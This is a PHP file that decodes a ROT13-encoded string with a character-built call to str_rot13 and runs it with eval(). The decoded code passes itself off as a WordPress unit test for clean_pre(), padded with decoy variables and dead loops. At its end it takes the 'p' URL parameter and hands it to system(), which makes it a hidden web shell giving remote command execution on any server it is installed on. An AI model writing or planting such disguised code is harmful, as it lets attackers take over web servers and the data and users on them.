<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Gur pyrna_cer() erzbirf cnentencu naq yvar oernx
 * gntf jvguva `<cer>` ryrzragf nf cneg bs jcnhgbc().
 *
 * @tebhc sbeznggvat
 * @rkcrpgrqQrcerpngrq pyrna_cer
 *
 * @pbiref ::pyrna_cer
 */
pynff Grfgf_Sbeznggvat_PyrnaCer rkgraqf JC_HavgGrfgPnfr {

	choyvp shapgvba grfg_erzbirf_frys_pybfvat_oe_jvgu_fcnpr() {
		$fbhepr = 'n o p\a<oe />fyqsw<oe />';
		$erf    = 'n o p\afyqsw';

		$guvf->nffregFnzr( $erf, pyrna_cer( $fbhepr ) );
	}

	choyvp shapgvba grfg_erzbirf_frys_pybfvat_oe_jvgubhg_fcnpr() {
		$fbhepr = 'n o p\a<oe/>fyqsw<oe/>';
		$erf    = 'n o p\afyqsw';
		$guvf->nffregFnzr( $erf, pyrna_cer( $fbhepr ) );
	}


	/**
	 * V qba'g guvax guvf pna rire unccra va cebqhpgvba;
	 * <oe> vf punatrq gb <oe /> ryfrjurer. Yrsg va orpnhfr
	 * gung ercynprzrag fubhyqa'g unccra (jung vs lbh jnag
	 * UGZY 4 bhgchg?).
	 */
	choyvp shapgvba grfg_erzbirf_ugzy_oe() {
		$fbhepr = 'n o p\a<oe>fyqsw<oe>';
		$erf    = 'n o p\afyqsw';
		$guvf->nffregFnzr( $erf, pyrna_cer( $fbhepr ) );
	}

	choyvp shapgvba grfg_erzbirf_c() {
		$fbhepr = \"<c>vfa'g guvf rkpvgvat!</c><c>bu vaqrrq!</c>\";
		$erf    = \"\avfa'g guvf rkpvgvat!\abu vaqrrq!\";
		$guvf->nffregFnzr( $erf, pyrna_cer( $fbhepr ) );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>